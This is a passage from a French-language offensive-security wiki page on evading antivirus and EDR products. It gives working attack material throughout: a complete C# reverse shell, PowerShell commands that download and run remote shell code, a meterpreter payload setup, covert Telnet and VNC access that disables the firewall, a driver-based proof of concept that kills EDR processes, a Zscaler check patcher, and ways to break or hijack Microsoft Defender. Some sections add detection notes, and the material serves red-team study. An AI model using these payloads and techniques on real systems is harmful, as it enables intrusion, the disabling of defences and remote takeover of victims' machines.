> Si vous voulez en savoir plus sur le chargement d'assembly C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez aussi charger des Assemblies C# **depuis PowerShell**, consultez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et la [vidéo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant en utilisant d'autres langages en donnant à la machine compromise accès **à l'environnement d'interpréteur installé sur le SMB contrôlé par l'attaquant**.

En permettant l'accès aux binaires de l'interpréteur et à l'environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** de la machine compromise.

Le repo indique : Defender scanne toujours les scripts, mais en utilisant Go, Java, PHP, etc., nous avons **plus de flexibilité pour contourner les signatures statiques**. Des tests avec des reverse shell aléatoires non obfusqués dans ces langages se sont avérés réussis.

## TokenStomping

Token stomping est une technique qui permet à un attaquant de **manipuler le token d'accès ou un produit de sécurité comme un EDR ou AV**, leur permettant de réduire ses privilèges de sorte que le processus ne meure pas mais n'ait pas les permissions pour vérifier les activités malveillantes.

Pour prévenir cela Windows pourrait **empêcher les processus externes** d'obtenir des handles sur les tokens des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Comme décrit dans [**cet article**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur le PC d'une victime puis de l'utiliser pour le prendre en main et maintenir la persistance :
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Remarque : le paramètre --pin permet de définir le PIN sans utiliser l'interface graphique.)

## Advanced Evasion

L'évasion est un sujet très complexe ; parfois il faut prendre en compte de nombreuses sources de télémétrie sur un seul système, donc il est pratiquement impossible de rester complètement indétecté dans des environnements matures.

Chaque environnement contre lequel vous opérez aura ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette présentation de [@ATTL4S](https://twitter.com/DaniLJ94) pour vous initier à des techniques d'évasion avancées.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ceci est aussi une autre excellente présentation de [@mariuszbit](https://twitter.com/mariuszbit) sur l'évasion en profondeur.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) qui va **retirer des parties du binaire** jusqu'à ce qu'il **détermine quelle partie Defender** considère comme malveillante et vous la sépare.\
Un autre outil faisant **la même chose** est [**avred**](https://github.com/dobin/avred) avec un service web public disponible sur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Jusqu'à Windows 10, toutes les versions de Windows incluaient un **serveur Telnet** que vous pouviez installer (en tant qu'administrateur) en faisant:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites-le **démarrer** au démarrage du système et **exécutez-le** maintenant :
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Changer le port telnet** (furtif) et désactiver le pare-feu:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l'option _Disable TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier **nouvellement** créé _**UltraVNC.ini**_ dans la **victim**

#### **Reverse connection**

Le **attacker** doit **exécuter sur** son **host** le binaire `vncviewer.exe -listen 5900` afin d'être **préparé** à récupérer une reverse **VNC connection**. Ensuite, dans la **victim** : démarrez le démon winvnc `winvnc.exe -run` et lancez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENTION :** Pour rester discret vous ne devez pas faire certaines choses

- Ne lancez pas `winvnc` s'il fonctionne déjà sinon vous déclencherez une [popup](https://i.imgur.com/1SROTTl.png). Vérifiez si c'est en cours avec `tasklist | findstr winvnc`
- Ne lancez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire sinon cela provoquera l'ouverture de [la fenêtre de configuration](https://i.imgur.com/rfMQWcf.png)
- N'exécutez pas `winvnc -h` pour obtenir de l'aide sinon vous déclencherez une [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
À l'intérieur de GreatSCT :
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Maintenant **lancez le lister** avec `msfconsole -r file.rc` et **exécutez** le **xml payload** avec :
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Le Defender actuel terminera le processus très rapidement.**

### Compiler notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier reverse shell en C#

Compilez-le avec :
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# : utiliser le compilateur
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d'obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemple d'utilisation de Python pour créer des injecteurs :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Neutraliser AV/EDR depuis l'espace noyau

Storm-2603 a utilisé un petit utilitaire console connu sous le nom de **Antivirus Terminator** pour désactiver les protections endpoint avant de déployer un ransomware. L'outil apporte son **propre driver vulnérable mais *signé*** et l'abuse pour émettre des opérations privilégiées en kernel qui même les services AV en Protected-Process-Light (PPL) ne peuvent pas bloquer.

Key take-aways
1. **Signed driver**: Le fichier déposé sur le disque est `ServiceMouse.sys`, mais le binaire est le driver légitimement signé `AToolsKrnl64.sys` d'Antiy Labs’ “System In-Depth Analysis Toolkit”. Parce que le driver porte une signature Microsoft valide, il se charge même lorsque Driver-Signature-Enforcement (DSE) est activé.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La première ligne enregistre le driver comme un **service kernel** et la seconde le démarre afin que `\\.\ServiceMouse` devienne accessible depuis l'espace utilisateur.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD évite entièrement les protections en mode utilisateur ; du code exécuté dans le kernel peut ouvrir des processus *protected*, les terminer, ou altérer des objets kernel indépendamment de PPL/PP, ELAM ou d'autres mécanismes de durcissement.

Detection / Mitigation
•  Activez la liste de blocage des drivers vulnérables de Microsoft (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.  
•  Surveillez la création de nouveaux services *kernel* et alertez lorsqu'un driver est chargé depuis un répertoire world-writable ou n'est pas présent dans la allow-list.  
•  Surveillez les handles en mode utilisateur vers des device objects personnalisés suivis d'appels `DeviceIoControl` suspects.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** applique les règles de posture de l'appareil localement et s'appuie sur Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception faibles rendent un contournement complet possible :

1. L'évaluation de posture se passe **entièrement côté client** (un booléen est envoyé au serveur).  
2. Les endpoints RPC internes ne valident que l'exécutable connectant est **signé par Zscaler** (via `WinVerifyTrust`).

En **patchant quatre binaires signés sur le disque** les deux mécanismes peuvent être neutralisés :

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Retourne toujours `1` de sorte que chaque contrôle est conforme |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacée par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Court-circuités |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Après avoir remplacé les fichiers originaux et redémarré la pile de services :

* **Toutes** les vérifications de posture affichent **vert/conforme**.
* Des binaires non signés ou modifiés peuvent ouvrir les named-pipe RPC endpoints (p.ex. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* La machine compromise obtient un accès illimité au réseau interne défini par les politiques Zscaler.

Cette étude de cas montre comment des décisions de confiance purement côté client et de simples vérifications de signature peuvent être contournées avec quelques modifications d'octets.

## Abuser Protected Process Light (PPL) pour manipuler AV/EDR avec LOLBINs

Protected Process Light (PPL) impose une hiérarchie signer/niveau de sorte que seuls les processus protégés de niveau égal ou supérieur peuvent se modifier mutuellement. Offensivement, si vous pouvez lancer légitimement un binaire activé PPL et contrôler ses arguments, vous pouvez convertir une fonctionnalité bénigne (p.ex. logging) en une primitive d'écriture contrainte, soutenue par PPL, contre des répertoires protégés utilisés par AV/EDR.

Ce qui fait qu'un processus s'exécute en tant que PPL
- L'EXE cible (et toutes DLL chargées) doit être signé avec un EKU compatible PPL.
- Le processus doit être créé avec CreateProcess en utilisant les flags : `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Un niveau de protection compatible doit être demandé et correspondre au signataire du binaire (p.ex. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` pour les signataires anti-malware, `PROTECTION_LEVEL_WINDOWS` pour les signataires Windows). Des niveaux incorrects échoueront à la création.

Voir aussi une introduction plus large à PP/PPL et à la protection de LSASS ici :

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Outils de lancement
- Outil open-source : CreateProcessAsPPL (sélectionne le niveau de protection et transmet les arguments à l'EXE cible) :
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Exemple d'utilisation :
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui‑même et accepte un paramètre pour écrire un fichier journal vers un chemin spécifié par l'appelant.
- Lorsqu'il est lancé en tant que processus PPL, l'écriture du fichier s'effectue avec la protection PPL.
- ClipUp ne peut pas analyser les chemins contenant des espaces ; utilisez des chemins courts 8.3 pour pointer vers des emplacements normalement protégés.

8.3 short path helpers
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Dériver le chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Lancer le LOLBIN compatible PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` en utilisant un lanceur (par ex., CreateProcessAsPPL).
2) Passer l'argument chemin-journal de ClipUp pour forcer la création d'un fichier dans un répertoire AV protégé (par ex., Defender Platform). Utiliser des noms courts 8.3 si nécessaire.
3) Si le binaire cible est normalement ouvert/verrouillé par l'AV pendant qu'il fonctionne (par ex., MsMpEng.exe), planifier l'écriture au démarrage avant que l'AV ne démarre en installant un service à démarrage automatique qui s'exécute de manière fiable plus tôt. Valider l'ordre de démarrage avec Process Monitor (boot logging).
4) Au redémarrage, l'écriture soutenue par PPL se produit avant que l'AV ne verrouille ses binaires, corrompant le fichier cible et empêchant le démarrage.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Vous ne pouvez pas contrôler le contenu que ClipUp écrit au-delà de son emplacement ; la primitive est adaptée à la corruption plutôt qu'à l'injection de contenu précise.
- Nécessite local admin/SYSTEM pour installer/démarrer un service et une fenêtre de redémarrage.
- Le timing est critique : la cible ne doit pas être ouverte ; l'exécution au démarrage évite les verrous de fichiers.

Detections
- Création de processus `ClipUp.exe` avec des arguments inhabituels, en particulier dont le parent est un lanceur non standard, autour du démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrant systématiquement avant Defender/AV. Investiguer la création/modification de services avant les échecs de démarrage de Defender.
- Surveillance de l'intégrité des fichiers sur les binaires Defender/les répertoires Platform ; créations/modifications inattendues de fichiers par des processus avec des drapeaux protected-process.
- ETW/EDR telemetry : rechercher des processus créés avec `CREATE_PROTECTED_PROCESS` et une utilisation anormale des niveaux PPL par des binaires non-AV.

Mitigations
- WDAC/Code Integrity : restreindre les binaires signés autorisés à s'exécuter en tant que PPL et sous quels parents ; bloquer les invocations de ClipUp en dehors des contextes légitimes.
- Hygiène des services : restreindre la création/modification des services auto-start et surveiller les manipulations de l'ordre de démarrage.
- S'assurer que Defender tamper protection et les protections d'early-launch sont activées ; investiguer les erreurs de démarrage indiquant une corruption binaire.
- Envisager de désactiver la génération de noms courts 8.3 sur les volumes hébergeant des outils de sécurité si compatible avec votre environnement (tester soigneusement).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender choisit la Platform à partir de laquelle il s'exécute en énumérant les sous-dossiers sous:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Il sélectionne le sous-dossier ayant la chaîne de version la plus élevée en ordre lexicographique (par ex., `4.18.25070.5-0`), puis démarre les processus de service Defender à partir de là (mettant à jour les chemins de service/registre en conséquence). Cette sélection fait confiance aux entrées de répertoire, y compris les directory reparse points (symlinks). Un administrateur peut tirer parti de cela pour rediriger Defender vers un chemin inscriptible par un attaquant et obtenir du DLL sideloading ou perturber le service.

Preconditions
- Local Administrator (nécessaire pour créer des répertoires/symlinks sous le dossier Platform)
- Possibilité de redémarrer ou de déclencher la re-sélection de la Platform de Defender (redémarrage du service au démarrage)
- Seuls des outils intégrés sont nécessaires (mklink)

Why it works
- Defender bloque les écritures dans ses propres dossiers, mais sa sélection de Platform fait confiance aux entrées de répertoire et choisit la version la plus élevée lexicographiquement sans vérifier que la cible résout vers un chemin protégé/fiable.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Créez un symlink de répertoire de version supérieure dans Platform pointant vers votre dossier :
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Sélection du déclencheur (redémarrage recommandé) :
```cmd
shutdown /r /t 0
```
4) Vérifier que MsMpEng.exe (WinDefend) s'exécute depuis le chemin redirigé :
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Vous devriez observer le nouveau chemin de processus sous `C:\TMP\AV\` et la configuration du service/registry reflétant cet emplacement.

Post-exploitation options
- DLL sideloading/code execution : Drop/replace DLLs que Defender charge depuis son répertoire d'application pour exécuter du code dans les processus de Defender. Voir la section ci‑dessus : [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial : Supprimez le version-symlink afin qu'au prochain démarrage le chemin configuré ne se résolve plus et que Defender échoue à démarrer :
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Notez que cette technique ne fournit pas d'élévation de privilèges en elle‑même ; elle requiert des droits admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Les red teams peuvent déplacer l'évasion à l'exécution hors de l'implant C2 et dans le module cible lui‑même en hookant son Import Address Table (IAT) et en routant certaines APIs via du code position‑independent contrôlé par l'attaquant (PIC). Cela généralise l'évasion au-delà de la petite surface d'API que beaucoup de kits exposent (par ex., CreateProcessA), et étend les mêmes protections aux BOFs et DLLs post‑exploitation.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). Le PIC doit être autonome et position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Les évasions typiques incluent :
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing : construire une pile bénigne et transiter vers l'API cible afin que l'analyse de la call‑stack résolve vers les frames attendus.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs : hooker LoadLibrary* permet d'intercepter les chargements de modules (par ex., System.Management.Automation.dll, clr.dll) et d'appliquer le même masquage/évasion de pile à leurs appels d'API.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Remarques
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Intégration opérationnelle
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Considérations Détection/DFIR
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Composants et exemples associés
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## Références

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
